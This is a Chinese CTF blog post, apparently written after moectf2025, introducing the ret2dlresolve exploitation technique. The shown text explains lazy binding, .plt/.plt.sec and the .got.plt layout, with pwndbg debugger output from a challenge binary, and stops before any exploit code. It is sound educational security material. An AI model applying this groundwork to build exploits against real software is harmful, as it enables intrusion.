<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>关于ret2dlresolve | r3t2's blog</title><meta name="author" content="r3t2"><meta name="copyright" content="r3t2"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x00时值 moectf2025 ，出了一题打ret2dlresolve（虽然仍然可以打ret2libc），回想起自从学习了re2dlresolve后几乎没碰到过只能打这个的题，所以也没有记录，于是借此机会记录一下参考博客https://xz.aliyun.com/news/17612 0x01 延迟绑定流程 PLT与GOT炒炒冷饭（ 延迟绑定流程初次调用  解析完成后，后续调用  我们简单验证">
<meta property="og:type" content="article">
<meta property="og:title" content="关于ret2dlresolve">
<meta property="og:url" content="https://fuckth3w0r1d.github.io/2025/09/10/%E5%85%B3%E4%BA%8Eret2dlresolve/index.html">
<meta property="og:site_name" content="r3t2's blog">
<meta property="og:description" content="0x00时值 moectf2025 ，出了一题打ret2dlresolve（虽然仍然可以打ret2libc），回想起自从学习了re2dlresolve后几乎没碰到过只能打这个的题，所以也没有记录，于是借此机会记录一下参考博客https://xz.aliyun.com/news/17612 0x01 延迟绑定流程 PLT与GOT炒炒冷饭（ 延迟绑定流程初次调用  解析完成后，后续调用  我们简单验证">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fuckth3w0r1d.github.io/img/saber_flower.jpg">
<meta property="article:published_time" content="2025-09-10T11:13:27.000Z">
<meta property="article:modified_time" content="2025-09-11T11:15:25.311Z">
<meta property="article:author" content="r3t2">
<meta property="article:tag" content="笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fuckth3w0r1d.github.io/img/saber_flower.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "关于ret2dlresolve",
  "url": "https://fuckth3w0r1d.github.io/2025/09/10/%E5%85%B3%E4%BA%8Eret2dlresolve/",
  "image": "https://fuckth3w0r1d.github.io/img/saber_flower.jpg",
  "datePublished": "2025-09-10T11:13:27.000Z",
  "dateModified": "2025-09-11T11:15:25.311Z",
  "author": [
    {
      "@type": "Person",
      "name": "r3t2",
      "url": "https://fuckth3w0r1d.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/machine.png"><link rel="canonical" href="https://fuckth3w0r1d.github.io/2025/09/10/%E5%85%B3%E4%BA%8Eret2dlresolve/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":5,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '关于ret2dlresolve',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/search_style.css"><style>.category-list-count{display:none !important;}</style><link rel="stylesheet" href="/css/background_modify.css"><link rel="stylesheet" href="/css/transpancy_modify.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/ghostrunner.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/Rick.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/saber_flower.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">r3t2's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">关于ret2dlresolve</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">关于ret2dlresolve</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-10T11:13:27.000Z" title="发表于 2025-09-10 19:13:27">2025-09-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-11T11:15:25.311Z" title="更新于 2025-09-11 19:15:25">2025-09-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/stack/">stack</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/stack/ret2dlresolve/">ret2dlresolve</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(/img/saber_flower.jpg);"></div><article class="container post-content" id="article-container"><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>时值 moectf2025 ，出了一题打<code>ret2dlresolve</code>（虽然仍然可以打<code>ret2libc</code>），回想起自从学习了<code>re2dlresolve</code>后几乎没碰到过只能打这个的题，所以也没有记录，于是借此机会记录一下<br>参考博客<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17612">https://xz.aliyun.com/news/17612</a></p>
<h2 id="0x01-延迟绑定流程-PLT与GOT"><a href="#0x01-延迟绑定流程-PLT与GOT" class="headerlink" title="0x01 延迟绑定流程 PLT与GOT"></a>0x01 延迟绑定流程 PLT与GOT</h2><p><del>炒炒冷饭（</del></p>
<h4 id="延迟绑定流程"><a href="#延迟绑定流程" class="headerlink" title="延迟绑定流程"></a>延迟绑定流程</h4><p>初次调用</p>
<p><img src="/images/plt-got1.png"></p>
<p>解析完成后，后续调用</p>
<p><img src="/images/plt-got2.png"></p>
<p>我们简单验证一下，调用前</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; plt</span><br><span class="line">Section .plt 0x401020 - 0x401070:</span><br><span class="line">No symbols found in section .plt</span><br><span class="line">Section .plt.sec 0x401070 - 0x4010b0:</span><br><span class="line">0x401070: write@plt</span><br><span class="line">0x401080: strlen@plt</span><br><span class="line">0x401090: setbuf@plt</span><br><span class="line">0x4010a0: read@plt</span><br><span class="line"></span><br><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/r3t2/ctf/moectf2025/pwn/nowaytoleak/pwn_patched:</span><br><span class="line">GOT protection: Partial RELRO | Found 4 GOT entries passing the filter</span><br><span class="line">[0x404018] write@GLIBC_2.2.5 -&gt; 0x401030 ◂— endbr64</span><br><span class="line">[0x404020] strlen@GLIBC_2.2.5 -&gt; 0x401040 ◂— endbr64</span><br><span class="line">[0x404028] setbuf@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64</span><br><span class="line">[0x404030] read@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8i 0x401070</span><br><span class="line">   0x401070 &lt;write@plt&gt;:        endbr64</span><br><span class="line">   0x401074 &lt;write@plt+4&gt;:      bnd jmp QWORD PTR [rip+0x2f9d]        # 0x404018 &lt;write@got.plt&gt;</span><br><span class="line">   0x40107b &lt;write@plt+11&gt;:     nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x401080 &lt;strlen@plt&gt;:       endbr64</span><br><span class="line">   0x401084 &lt;strlen@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2f95]        # 0x404020 &lt;strlen@got.plt&gt;</span><br><span class="line">   0x40108b &lt;strlen@plt+11&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x401090 &lt;setbuf@plt&gt;:       endbr64</span><br><span class="line">   0x401094 &lt;setbuf@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2f8d]        # 0x404028 &lt;setbuf@got.plt&gt;</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; x/8i *0x404018</span><br><span class="line">   0x401030:    endbr64</span><br><span class="line">   0x401034:    push   0x0</span><br><span class="line">   0x401039:    bnd jmp 0x401020</span><br><span class="line">   0x40103f:    nop</span><br><span class="line">   0x401040:    endbr64</span><br><span class="line">   0x401044:    push   0x1</span><br><span class="line">   0x401049:    bnd jmp 0x401020</span><br><span class="line">   0x40104f:    nop</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; x/8i 0x401020</span><br><span class="line">   0x401020:    push   QWORD PTR [rip+0x2fe2]        # 0x404008</span><br><span class="line">   0x401026:    bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010</span><br><span class="line">   0x40102d:    nop    DWORD PTR [rax]</span><br><span class="line">   0x401030:    endbr64</span><br><span class="line">   0x401034:    push   0x0</span><br><span class="line">   0x401039:    bnd jmp 0x401020</span><br><span class="line">   0x40103f:    nop</span><br><span class="line">   0x401040:    endbr64</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; tele 0x404010</span><br><span class="line">00:0000│  0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7fe7bc0 ◂— endbr64</span><br><span class="line">01:0008│  0x404018 (write@got[plt]) —▸ 0x401030 ◂— endbr64</span><br><span class="line">02:0010│  0x404020 (strlen@got[plt]) —▸ 0x401040 ◂— endbr64</span><br><span class="line">03:0018│  0x404028 (setbuf@got[plt]) —▸ 0x401050 ◂— endbr64</span><br><span class="line">04:0020│  0x404030 (read@got[plt]) —▸ 0x401060 ◂— endbr64</span><br><span class="line">05:0028│  0x404038 ◂— 0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8i 0x7ffff7fe7bc0</span><br><span class="line">   0x7ffff7fe7bc0:      endbr64</span><br><span class="line">   0x7ffff7fe7bc4:      push   rbx</span><br><span class="line">   0x7ffff7fe7bc5:      mov    rbx,rsp</span><br><span class="line">   0x7ffff7fe7bc8:      and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x7ffff7fe7bcc:      sub    rsp,QWORD PTR [rip+0x14b35]        # 0x7ffff7ffc708 &lt;_rtld_global_ro+232&gt;</span><br><span class="line">   0x7ffff7fe7bd3:      mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x7ffff7fe7bd7:      mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x7ffff7fe7bdc:      mov    QWORD PTR [rsp+0x10],rdx</span><br></pre></td></tr></tbody></table></figure>

<p>注意到这里是<code>.plt.sec</code>而非<code>.plt</code>，下面再分析。这里最后先<code>push   QWORD PTR [rip+0x2fe2]</code>最后<code> jmp QWORD PTR [rip+0x2fe3]</code>，其实是<code>push link_map</code>，<code> jmp _dl_runtime_resolve</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2gx 0x404008</span><br><span class="line">0x404008:       0x00007ffff7ffe190      0x00007ffff7fe7bc0</span><br></pre></td></tr></tbody></table></figure>

<h4 id="PLT（-plt-plt-sec）"><a href="#PLT（-plt-plt-sec）" class="headerlink" title="PLT（.plt/.plt.sec）"></a>PLT（.plt/.plt.sec）</h4><p>那么现在来分析一下<code>.plt.sec</code>的问题，以及它与传统的<code>.plt</code>有何不同。在传统<code>.plt</code>中</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func@plt:</span><br><span class="line">jmp    [func@got.plt]  ; 第一次跳转，直接跳转到 GOT 中存储的地址</span><br><span class="line">push   offset          ; offset 为该函数在 GOT 中的索引，如果是第一次调用，GOT 中的地址指向下一条指令</span><br><span class="line">jmp    .plt[0]            ; 跳转到 PLT 的“调度程序”</span><br></pre></td></tr></tbody></table></figure>

<p>这个<code>.plt[0]</code>正是指代</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3i 0x401020</span><br><span class="line">   0x401020:    push   QWORD PTR [rip+0x2fe2]        # 0x404008 push link_map</span><br><span class="line">   0x401026:    bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010 jmp _dl_runtime_resolve</span><br><span class="line">   0x40102d:    nop    DWORD PTR [rax]</span><br></pre></td></tr></tbody></table></figure>

<p>此处，结构如下所示</p>
<p><img src="/images/plt0.png"></p>
<p>其中 n 为函数 <code>bar</code> 在 GOT 表中的值的索引，<code>bar@GOT</code> 中初始值为 <code>jmp *(bar@GOT)</code> 指令的下一条指令，也就是说第一次调用 <code>bar</code> 函数的时候会继续执行跳转至 <code>PLT0</code> 进行 <code>bar@GOT</code> 的重定位并调用 <code>bar</code> 函数；第二次调用 <code>bar</code> 函数的时候由于 <code>bar@GOT</code> 已完成重定位因此会直接跳转至 <code>bar</code> 函数。<br>至于<code>.plt.sec</code>，从 <strong>binutils 2.29 / glibc 2.26</strong> 开始，引入了 <code>.plt.sec</code>，目的有两个：</p>
<ul>
<li>优化性能：对于不需要 <code>lazy binding</code> 的符号直接生成 <code>.plt.sec</code> 的短跳转，而不是冗余的 <code>.plt</code> 入口。</li>
<li>减少攻击面：避免额外的 <code>push reloc_index; jmp plt[0]</code></li>
</ul>
<p>我们看调试的<code>.plt.sec</code>信息</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8i 0x401070</span><br><span class="line">   0x401070 &lt;write@plt&gt;:        endbr64</span><br><span class="line">   0x401074 &lt;write@plt+4&gt;:      bnd jmp QWORD PTR [rip+0x2f9d]        # 0x404018 &lt;write@got.plt&gt;</span><br><span class="line">   0x40107b &lt;write@plt+11&gt;:     nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x401080 &lt;strlen@plt&gt;:       endbr64</span><br><span class="line">   0x401084 &lt;strlen@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2f95]        # 0x404020 &lt;strlen@got.plt&gt;</span><br><span class="line">   0x40108b &lt;strlen@plt+11&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x401090 &lt;setbuf@plt&gt;:       endbr64</span><br><span class="line">   0x401094 &lt;setbuf@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2f8d]        # 0x404028 &lt;setbuf@got.plt&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>就是仅仅跳转到<code>got</code>表项存放的地址处</p>
<h4 id="GOT-（-got-got-plt）"><a href="#GOT-（-got-got-plt）" class="headerlink" title="GOT （.got/.got.plt）"></a>GOT （.got/.got.plt）</h4><p>ELF 将 GOT 拆分成了两个表叫做 <code>.got</code> 和 <code>.got.plt</code> 。其中 <code>.got</code> 用来保存全局变量引用的地址，<code>.got.plt</code> 用来保存函数引用的地址，也就是说，所有对于外部函数的引用全部被分离出来放到了 <code>.got.plt</code> 中（当然有的 ELF 文件可能吧这两个表合并为一个 <code>.got</code> 表，结构等同于后面提到的 <code>.got.plt</code>）。另外 <code>.got.plt</code> 还有一个特殊的地方是它的前三项是有特殊意义的，分别含义如下：</p>
<ul>
<li><p>第一项保存的是 <code>.dynamic</code> 段的偏移（也有可能是 <code>.dynamic</code> 段的地址）。 </p>
</li>
<li><p>第二项是一个 <code>link_map</code> 的结构体指针，里面保存着动态链接的一些相关信息，是重定位函数 <code>_dl_runtime_resolve</code> 的第一个参数。 </p>
</li>
<li><p>第三项保存的是 <code>_dl_runtime_resolve</code> 的地址。</p>
</li>
</ul>
<p>我们查看一下前几个表项</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x404000 3</span><br><span class="line">00:0000│  0x404000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x403e20 (_DYNAMIC) ◂— 1</span><br><span class="line">01:0008│  0x404008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7ffff7ffe190 ◂— 0</span><br><span class="line">02:0010│  0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7fe7bc0 ◂— endbr64</span><br></pre></td></tr></tbody></table></figure>

<p>第一项<code>0x403e20</code>正是<code>.dynamic</code>的偏移</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfsections</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End     Perm       Size  Name</span><br><span class="line">          0x3fc3c0           0x3fc43b      RW-       0x7b  .interp</span><br><span class="line">          0x3fe3a8           0x3fe3c8      RW-       0x20  .note.gnu.property</span><br><span class="line">          0x3fe3c8           0x3fe3ec      RW-       0x24  .note.gnu.build-id</span><br><span class="line">          0x3fe3f0           0x3fe410      RW-       0x20  .note.ABI-tag</span><br><span class="line">          0x3fe410           0x3fe440      RW-       0x30  .gnu.hash</span><br><span class="line">          0x3fe440           0x3fe530      RW-       0xf0  .dynsym</span><br><span class="line">          0x3fe530           0x3fe605      RW-       0xd5  .dynstr</span><br><span class="line">          0x400526           0x40053a      R--       0x14  .gnu.version</span><br><span class="line">          0x400540           0x400560      R--       0x20  .gnu.version_r</span><br><span class="line">          0x400560           0x4005d8      R--       0x78  .rela.dyn</span><br><span class="line">          0x4005d8           0x400638      R--       0x60  .rela.plt</span><br><span class="line">          0x401000           0x40101b      R-X       0x1b  .init</span><br><span class="line">          0x401020           0x401070      R-X       0x50  .plt</span><br><span class="line">          0x401070           0x4010b0      R-X       0x40  .plt.sec</span><br><span class="line">          0x4010b0           0x4012a5      R-X      0x1f5  .text</span><br><span class="line">          0x4012a8           0x4012b5      R-X        0xd  .fini</span><br><span class="line">          0x402000           0x402004      R--        0x4  .rodata</span><br><span class="line">          0x402004           0x402050      R--       0x4c  .eh_frame_hdr</span><br><span class="line">          0x402050           0x402170      R--      0x120  .eh_frame</span><br><span class="line">          0x403e10           0x403e18      R--        0x8  .init_array</span><br><span class="line">          0x403e18           0x403e20      R--        0x8  .fini_array</span><br><span class="line">          0x403e20           0x403ff0      R--      0x1d0  .dynamic</span><br><span class="line">          0x403ff0           0x404000      R--       0x10  .got</span><br><span class="line">          0x404000           0x404038      RW-       0x38  .got.plt</span><br><span class="line">          0x404040           0x4040c4      RW-       0x84  .data</span><br><span class="line">          0x4040e0           0x404110      RW-       0x30  .bss</span><br></pre></td></tr></tbody></table></figure>

<p>第二项，是程序自身的<code>link_map</code>结点指针</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7ffff7ffe190</span><br><span class="line">00:0000│  0x7ffff7ffe190 ◂— 0</span><br><span class="line">01:0008│  0x7ffff7ffe198 —▸ 0x7ffff7ffe730 ◂— 0</span><br><span class="line">02:0010│  0x7ffff7ffe1a0 —▸ 0x403e20 (_DYNAMIC) ◂— 1</span><br><span class="line">03:0018│  0x7ffff7ffe1a8 —▸ 0x7ffff7ffe740 —▸ 0x7ffff7fcd000 ◂— jg 0x7ffff7fcd047</span><br><span class="line">04:0020│  0x7ffff7ffe1b0 ◂— 0</span><br><span class="line">05:0028│  0x7ffff7ffe1b8 —▸ 0x7ffff7ffe190 ◂— 0</span><br><span class="line">06:0030│  0x7ffff7ffe1c0 ◂— 0</span><br><span class="line">07:0038│  0x7ffff7ffe1c8 —▸ 0x7ffff7ffe718 —▸ 0x7ffff7ffe730 ◂— 0</span><br><span class="line">pwndbg&gt; tele 0x7ffff7ffe740</span><br><span class="line">00:0000│  0x7ffff7ffe740 —▸ 0x7ffff7fcd000 ◂— jg 0x7ffff7fcd047</span><br><span class="line">01:0008│  0x7ffff7ffe748 —▸ 0x7ffff7ffebf0 ◂— 'linux-vdso.so.1'</span><br><span class="line">02:0010│  0x7ffff7ffe750 —▸ 0x7ffff7fcd3e0 ◂— 0xe</span><br><span class="line">03:0018│  0x7ffff7ffe758 —▸ 0x7ffff7fc7000 —▸ 0x7ffff7dd5000 ◂— 0x3010102464c457f</span><br><span class="line">04:0020│  0x7ffff7ffe760 —▸ 0x7ffff7ffe190 ◂— 0</span><br><span class="line">05:0028│  0x7ffff7ffe768 —▸ 0x7ffff7ffe740 —▸ 0x7ffff7fcd000 ◂— jg 0x7ffff7fcd047</span><br><span class="line">06:0030│  0x7ffff7ffe770 ◂— 0</span><br><span class="line">07:0038│  0x7ffff7ffe778 —▸ 0x7ffff7ffebc8 —▸ 0x7ffff7ffebf0 ◂— 'linux-vdso.so.1'</span><br></pre></td></tr></tbody></table></figure>

